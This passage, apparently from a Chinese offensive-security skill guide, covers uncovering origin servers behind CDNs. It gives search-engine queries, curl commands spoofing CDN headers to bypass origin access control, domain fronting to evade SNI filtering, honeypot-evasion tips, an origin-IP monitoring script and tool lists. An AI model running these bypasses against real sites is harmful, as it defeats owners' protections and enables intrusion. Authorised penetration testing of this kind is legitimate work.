ssl.cert.subject.cn:"target.com" -country:"US"  # 排除海外 CDN 节点

# === 6. 组合：源站特征画像 ===
# 自签名证书 + target 关键字 + 非标端口 → 高度疑似源站
ssl.cert.subject.cn:"target.com" ssl.cert.issuer:"target.com" -port:443
```

### Censys 进阶语法

```bash
# === 1. 证书搜索（Censys 证书库最全）===
services.tls.certificates.leaf_data.subject.common_name: "target.com"
# 排除 CDN 签发
services.tls.certificates.leaf_data.subject.common_name: "target.com" AND NOT services.tls.certificates.leaf_data.issuer.organization: "Cloudflare"

# === 2. 按证书序列号关联多 IP（同证书部署）===
services.tls.certificates.leaf_data.serial_number: <序列号>

# === 3. 服务端指纹（Censys 独有 H2 指纹）===
services.http.response.body_hash: "<body哈希>"   # 同页面内容
services.http.response.headers.Server: "nginx" AND services.tls.certificates.leaf_data.subject.common_name: "target.com"

# === 4. 端口扫描结果反查 ===
services.port: 8080 AND services.tls.certificates.leaf_data.names: "target.com"
```

### FOFA 进阶语法（国内首选）

```bash
# === 1. 证书反查 ===
cert="target.com"                              # 证书含目标
cert="target.com" && country="CN" && port!="443"
cert.subject="target.com" && cert.issuer!="Cloudflare"

# === 2. 资产关联 ===
domain="target.com"                            # 域名解析记录
host="target.com"                              # 主机名
ip="1.2.3.4/24"                                # C 段
body="target.com"                              # 响应体含目标
icon_hash="<哈希>"                              # Favicon

# === 3. 排除 CDN 误报 ===
cert="target.com" && server!="cloudflare" && server!="tencent-cos"
cert="target.com" && header!="cf-ray" && header!="x-amz-cf-id"

# === 4. ICP 备案关联（国内独有）===
icp="京ICP备12345678号"                         # 同备案号下所有资产
icp.cert="京ICP备12345678号" && cert="target.com"

# === 5. 端口特征 ===
cert="target.com" && port="8080,8443,9090,3000" # 非标端口
cert="target.com" && protocol="ssh"             # SSH 服务暴露
```

### ZoomEye / Quake 进阶语法

```bash
# === ZoomEye ===
ssl:"target.com"                                # 证书
ssl:"target.com" +port:"8080" -service:"cloudflare"
app:"nginx" +ssl:"target.com"
site:"target.com" -service:"cloudflare"        # Web 资产排除 CDN

# === Quake (360) ===
cert:"target.com"
cert:"target.com" AND NOT service:"cloudflare"
response:"target.com" AND port:"8080"
```

### 误报过滤通用规则

| 误报类型 | 过滤条件 | 引擎 |
|----------|----------|------|
| CDN 节点本身 | `-http.html:"cloudflare"` / `-header:"cf-ray"` | Shodan/FOFA |
| 共享主机默认页 | 加 `http.title:"target"` 缩窄 | Shodan |
| 旧 CDN 节点入库 | 加时效过滤（last_update） | Censys |
| 通配证书泛滥 | 按 Serial Number 而非 CN | 全部 |
| 测试环境 | `NOT port:443` 或排除常见测试端口 | 全部 |

---

## 反规避与防御感知溯源（v5.0 新增）

> 高价值目标会主动防御溯源：源站仅允许 CDN 回源 IP、SNI 过滤、地理封锁、速率限制、蜜罐陷阱。
> 本节提供反制策略。

### 防御机制识别

```bash
# === 1. 源站 IP 访问控制 ===
# 现象: 直连候选 IP 返回 403/timeout，但伪造 X-Forwarded-For 为 CDN 回源 IP 后 200
curl -sk -H "Host: target.com" https://候选IP -o /dev/null -w "%{http_code}\n"
# 伪造来源
curl -sk -H "Host: target.com" -H "X-Forwarded-For: 173.245.48.1" -H "CF-Connecting-IP: 173.245.48.1" https://候选IP -o /dev/null -w "%{http_code}\n"
# 403 → 200 → 源站仅信任 CDN 回源 IP，已确认是源站！

# === 2. SNI 过滤（421/400）===
openssl s_client -connect 候选IP:443 -servername wrong.com 2>&1 | grep -iE "421|reset"
openssl s_client -connect 候选IP:443 -servername target.com 2>&1 | grep -iE "subject"
# 错 SNI 被拒、正 SNI 通过 → 源站启用 SNI 白名单

# === 3. 地理封锁 ===
# 用多地 VPS 探测，部分区域超时
# 工具: 全球节点 ping (check-host.net API)
curl -s "https://check-host.net/check-ping?host=候选IP&max_nodes=50" -H "Accept: application/json"

# === 4. 蜜罐识别 ===
# 异常宽松的源站（返回完整源码、开放大量端口）可能是蜜罐
# 交叉验证: 该 IP 是否在 honeypot 数据库 (如 Shodan honeypot score)
```

### 反制技术

```bash
# === 1. 伪造 CDN 回源 IP 绕过访问控制 ===
# 关键头: X-Forwarded-For / X-Real-IP / CF-Connecting-IP / True-Client-IP / X-Forwarded
for hdr in "X-Forwarded-For: 173.245.48.1" "CF-Connecting-IP: 173.245.48.1" \
           "True-Client-IP: 173.245.48.1" "X-Real-IP: 173.245.48.1"; do
  echo "=== $hdr ==="
  curl -sk -H "Host: target.com" -H "$hdr" https://候选IP -o /dev/null -w "%{http_code}\n"
done

# === 2. 走 CDN 回源链路 ===
# 若源站仅允许 CDN 回源 IP，直接经 CDN 触发回源
# 利用缓存未命中 + 特定参数迫使 CDN 回源
curl -sk "https://target.com/health?_=$(date +%s%N)"

# === 3. 绕过 SNI 过滤 ===
# 用域名前置 (Domain Fronting): TLS SNI=cdn.com, Host=target.com
# Cloudflare 已禁用免费域前置，但部分 CDN 仍可
curl -sk --resolve cdn.com:443:候选IP -H "Host: target.com" https://cdn.com/

# === 4. IPv6 绕过 ===
# 部分源站仅对 IPv4 做 CDN 回源 IP 限制，IPv6 暴露
curl -sk -6 -H "Host: target.com" "https://[候选IPv6]"

# === 5. 协议绕过 ===
# HTTP/3 QUIC 可能不经 CDN 访问控制层
# 见方法 30
```

### 蜜罐识别清单

- 源站返回异常完整的调试信息（堆栈、内网拓扑）
- 候选 IP 开放 22/3306/6379 等敏感端口且弱口令
- 该 IP 在多个不相关目标的溯源中反复出现
- Shodan honeypot score 高（需 API）
- 行为不一致：相同请求多次响应不同（蜜罐记录并模拟）

---

## 持续监控与漂移检测（v5.0 新增）

> 源站 IP 会变更（云弹性、迁移、扩容）。一次性溯源不够，需持续监控漂移。

### 监控脚本

```python
#!/usr/bin/env python3
"""cdn_origin_monitor.py — 源站 IP 持续监控
用法: python3 cdn_origin_monitor.py target.com --interval 3600 --notify webhook_url
"""
import json, time, hashlib, subprocess, smtplib
from pathlib import Path
from datetime import datetime

STATE_FILE = "origin_state_{target}.json"

def load_state(target):
    f = Path(STATE_FILE.format(target=target))
    return json.loads(f.read_text()) if f.exists() else {"known_ips": [], "history": []}

def save_state(target, state):
    Path(STATE_FILE.format(target=target)).write_text(json.dumps(state, indent=2))

def discover(target):
    """复用溯源框架的核心发现阶段"""
    # 简化: crt.sh + 历史 DNS + 子域名
    import requests, re
    ips = set()
    try:
        r = requests.get(f"https://crt.sh/?q={target}&output=json", timeout=20)
        ips |= set(re.findall(r'\b\d{1,3}(?:\.\d{1,3}){3}\b', r.text))
    except: pass
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={target}", timeout=20)
        ips |= set(re.findall(r'\b\d{1,3}(?:\.\d{1,3}){3}\b', r.text))
    except: pass
    return {ip for ip in ips if not ip.startswith(('10.','127.','192.168.','172.'))}

def notify(webhook, msg):
    if webhook:
        requests.post(webhook, json={"text": msg})
    print(f"[!] {msg}")

def monitor(target, interval, webhook):
    state = load_state(target)
    while True:
        now = datetime.now().isoformat()
        current = discover(target)
        new_ips = current - set(state["known_ips"])
        gone_ips = set(state["known_ips"]) - current
        if new_ips:
            notify(webhook, f"[{target}] 发现新源站 IP: {new_ips}")
        if gone_ips and state["known_ips"]:
            notify(webhook, f"[{target}] 源站 IP 失效: {gone_ips}")
        state["known_ips"] = list(current)
        state["history"].append({"ts": now, "ips": list(current), "new": list(new_ips), "gone": list(gone_ips)})
        save_state(target, state)
        print(f"[{now}] current={len(current)} new={len(new_ips)} gone={len(gone_ips)}")
        time.sleep(interval)

if __name__ == '__main__':
    import argparse, requests
    ap = argparse.ArgumentParser()
    ap.add_argument('target'); ap.add_argument('--interval', type=int, default=3600)
    ap.add_argument('--notify', default=None)
    monitor(ap.parse_args().target, ap.parse_args().interval, ap.parse_args().notify)
```

### 监控部署建议

| 场景 | 间隔 | 触发条件 | 通知方式 |
|------|------|----------|----------|
| 关键资产 | 5-15 分钟 | 任一新 IP | Webhook + 短信 |
| 常规资产 | 1-6 小时 | 新 IP 出现 | 邮件 |
| 一次性验证 | 单次 | 历史漂移回顾 | 报告归档 |

### 漂移信号解读

- **新 IP 出现**：源站扩容/迁移/灾备切换 → 重新溯源确认
- **旧 IP 失效**：IP 释放，可能被他人分配 → 历史关联失效
- **IP 段集中变化**：云厂商区域迁移 → 更新候选库
- **证书指纹变化**：源站换证书 → 可能换服务器，重做指纹验证

---

## 真实案例工作流（v5.0 新增）

### 案例 1：Cloudflare 代理的电商站（综合溯源）

```
目标: shop.example.com (Cloudflare 代理，含 Tunnel 嫌疑)
步骤:
1. dig CNAME → 非 cfargotunnel，普通 Cloudflare 代理
2. crt.sh 查 %.example.com → 发现 dev.example.com, api.example.com, mail.example.com
3. 子域名解析: dev.example.com → 203.0.113.5 (非 Cloudflare 段)
4. 直连 203.0.113.5 + Host: shop.example.com → 200, Server: nginx/1.20
5. JA4S 对比: CDN (Cloudflare) ≠ 直连 (nginx) → 不同栈
6. 页面哈希: 经 CDN 的首页 SHA256 == 直连首页 SHA256 → 内容一致
7. 贝叶斯评分: A(cert)+C(subdomain)+E(fingerprint) → P=97%
结论: 203.0.113.5 为源站。dev 子域名未接入 CDN 是泄露点。
```

### 案例 2：阿里云 CDN + OSS 架构

```
目标: static.example.com (阿里云 CDN)
步骤:
1. CNAME → example.com.w.kunlun*.com → 阿里云 CDN
2. 源站类型探测: 尝试 OSS 直连
   for region in cn-hangzhou cn-beijing cn-shanghai; do
     curl https://example.oss-$region.aliyuncs.com/
   done → cn-hangzhou 返回 200 + 相同内容
3. OSS Bucket 公网 IP 即"源站"，但需找 Web 源站
4. SPF/MX: dig MX example.com → mail.example.com → 47.x.x.x (阿里云 ECS)
5. 直连 47.x.x.x + Host: www.example.com → 200, Server: Tengine
6. 验证: 内容一致 + JA4S 不同 → P=92%
结论: Web 源站 47.x.x.x (ECS)，静态资源源站 OSS Bucket。
```

### 案例 3：AWS CloudFront + Lambda@Edge

```
目标: app.example.com (CloudFront, x-amz-cf-id 头)
步骤:
1. 常规溯源失败: crt.sh 无非 CDN 证书, 子域名全走 CloudFront
2. Lambda@Edge 触发: 超长 cookie 触发 502, 错误页含 ARN
   → ARN 暴露 region: us-east-1, function: app-edge
3. CloudFront 备用域名: crt.sh 查 example.com 证书 → 发现 api.example.com
4. api.example.com 直连 EC2 (历史 DNS: SecurityTrails 返回 54.x.x.x)
5. 直连 54.x.x.x + Host: api.example.com → 200
6. 间接确认: app.example.com 的 API 调用指向 api.example.com → 同源
结论: 源站 54.x.x.x (EC2)，Lambda@Edge ARN 泄露提供线索。
```

### 案例 4：防御感知（源站仅允许 CDN 回源）

```
目标: secure.example.com (Cloudflare, Authenticated Origin Pulls)
步骤:
1. 候选 IP (历史 DNS): 198.51.100.10
2. 直连 → 403 (需客户端证书)
3. 伪造 X-Forwarded-For: 173.245.48.1 → 仍 403 (Authenticated Origin Pulls 需真实 mTLS)
4. 改用被动确认:
   - Censys 查 198.51.100.10 证书 → 含 example.com SAN ✓
   - Shodan 查该 IP → 443 端口证书匹配 ✓
   - 该 IP ASN 非 Cloudflare (ASxxxx) ✓
5. 贝叶斯评分: A(cert)+B(DNS历史)+F(空间引擎) → P=85%
   (无 E 指纹因 mTLS 阻断直连)
结论: 198.51.100.10 高度疑似源站，但需经 CDN 链路验证。
教训: Authenticated Origin Pulls 是最强源站防护，被动方法是唯一路径。
```

---

## 在线工具速查

| 工具 | 用途 | URL |
|------|------|-----|
| crt.sh | 证书透明度 | https://crt.sh |
| CertSpotter | 证书透明度（备用） | https://sslmate.com/certspotter/ |
| Censys | 网络空间搜索 | https://search.censys.io |
| Shodan | 网络空间搜索 | https://www.shodan.io |
| FOFA | 网络空间搜索 | https://fofa.info |
| ZoomEye | 网络空间搜索 | https://www.zoomeye.org |
| Quake | 网络空间搜索 | https://quake.360.cn |
| SecurityTrails | 历史 DNS | https://securitytrails.com |
| HackerTarget | 历史 DNS | https://hackertarget.com |
| VirusTotal | 历史 DNS | https://www.virustotal.com |
| AlienVault OTX | 被动 DNS | https://otx.alienvault.com |
| DNSDumpster | DNS 枚举 | https://dnsdumpster.com |
| 多地 Ping | CDN 检测 | https://ping.chinaz.com |
| IPIP CDN检测 | CDN 识别 | https://tools.ipip.net/cdn.php |
| ICP备案 | 备案查询 | https://beian.miit.gov.cn |
| 站大爷 | 多地 Ping | https://17ce.com |
| kaeferjaeger | CDN IP 范围 | https://kaeferjaeger.gay |
| BGP.HE | ASN/IP 查询 | https://bgp.he.net |
| OSINT Radar | Cloudflare 溯源 | https://www.osintradar.com/tools/cloudflare-ip-finder |
| ViewDNS | 反向 IP 查询 | https://viewdns.info/reverseip/ |
| YouGetSignal | 反向 IP 查询 | https://yougetsignal.com |
| Wayback Machine | 历史网页 | https://web.archive.org |
| BuiltWith | 技术栈分析 | https://builtwith.com |
| Robtex | DNS/路由分析 | https://www.robtex.com |
| check-host | 全球多节点探测 | https://check-host.net |
| DNSlytics | 反向 IP/关联 | https://dnslytics.com |
| GrayhatWarfare | 开放存储桶搜索 | https://buckets.grayhatwarfare.com |
| PublicWWW | 源码搜索 | https://publicwww.com |
| URLscan | 历史扫描记录 | https://urlscan.io |
| CIRCL Passive DNS | 被动 DNS | https://www.circl.lu/services/passive-dns/ |
| Cloudflare IP Finder | CF 源站发现 | https://www.osintradar.com/tools/cloudflare-ip-finder |

---

## 开源工具

| 工具 | 说明 | 安装 |
|------|------|------|
| CloudFail | Cloudflare 溯源 | `git clone https://github.com/m0rtem/CloudFail` |
| CloakQuest3r | CDN 溯源综合 | `git clone https://github.com/spyboy-productions/CloakQuest3r` |
| cfsearch | Go 批量 IP 验证 | `git clone https://github.com/internetkafe/cfsearch` |
| SHROUD | WAF/CDN 溯源引擎 | `pip install red-specter-shroud` |
| OneForAll | 子域名枚举（国内） | `git clone https://github.com/shmilylty/OneForAll` |
| Subfinder | 子域名枚举 | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| Amass | 子域名枚举 | `go install github.com/owasp-amass/amass/v4/...@master` |
| httpx | HTTP 探测 | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| unwaf | 被动源站发现 | `pip install unwaf` |
| cloudflair | Cloudflare 溯源 | `git clone https://github.com/christophetd/CloudFlair` |
| **ja4** | **JA3/JA4 TLS 指纹** | `go install github.com/foxio/ja4@latest` |
| **fingerprintx** | 服务指纹识别 | `go install github.com/praetorian-inc/fingerprintx@latest` |
| **smuggler** | HTTP 请求走私检测 | `git clone https://github.com/defparam/smuggler` |
| **h2csmuggler** | HTTP/2 走私 | `git clone https://github.com/BishopFox/h2csmuggler` |
| **graphw00f** | GraphQL 指纹 | `pip install graphw00f` |
| **cloud_enum** | 多云存储桶枚举 | `git clone https://github.com/initstring/cloud_enum` |
| **lazarus** | S3 桶枚举 | `pip install lazarus` |
| **git-dumper** | .git 目录还原 | `pip install git-dumper` |
| **gitleaks** | 仓库密钥扫描 | `git clone https://github.com/zricethezav/gitleaks` |
| **unveilr** | 小程序反编译 | `git clone https://github.com/r3x5ur/unveilr` |
| **dnsx / massdns** | 高速 DNS 解析 | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| **altdns / dnsgen** | 子域名排列生成 | `pip install dnsgen` |

---

## 注意事项

1. **合法性**：仅用于授权测试、自有资产验证或安全研究
2. **组合使用**：单方法可能误报，建议 3 种以上方法交叉验证
3. **Host 头**：验证时务必设置正确的 Host 头
4. **HTTPS 优先**：优先使用 HTTPS 连接候选 IP
5. **CDN 范围过滤**：先排除 CDN 节点 IP，再验证
6. **源站访问控制**：有些源站仅允许 CDN 回源 IP 访问，需伪造来源
7. **持续监控**：源站 IP 可能变更，建议定期重新溯源
8. **(v5.0) 必做指纹验证**：Host 头返回 200 不等于源站，必须叠加 JA4S/HTTP2 指纹
9. **(v5.0) 警惕蜜罐**：异常宽松的源站需交叉验证，避免落入蜜罐
10. **(v5.0) 贝叶斯评分优先**：用 P≥0.95 阈值替代经验判断，降低主观误判

---

## 相关技能

- **recon-and-methodology** — 信息收集方法论
- **subdomain-takeover** — 子域名接管
- **waf-bypass-techniques** — WAF 绕过技术
- **ssrf-server-side-request-forgery** — SSRF 可配合 CDN 溯源（命中 cloudflared metrics）
- **dns-rebinding-attacks** — DNS 重绑定绕过 CDN
- **http-request-smuggling** — 请求走私配合 CDN↔源站边界
- **cloud-security** — 云存储桶 / Serverless / K8s 暴露面
- **tls-fingerprinting** — JA3/JA4 与反指纹
- **mobile-app-pentest** — APK/IPA 逆向取硬编码 IP
- **hack** — 主路由入口

<!-- 数据源：CT Logs, Shodan, Censys, FOFA, ZoomEye, Quake, SecurityTrails, VirusTotal, AlienVault, kaeferjaeger, BGP.HE, urlscan, DNSlytics, 实战经验 · 方法论 v5.0 · 50 种方法 · 30+ 厂商绕过 · JA4/HTTP2 现代指纹验证 · 贝叶斯置信度 · Python Pipeline · 反规避 + 持续监控 · DNS Rebinding · HPACK侧信道 · Anycast去匿名化 · Origin Shield绕过 · 速率限制差分 · 源站IP漂移追踪 -->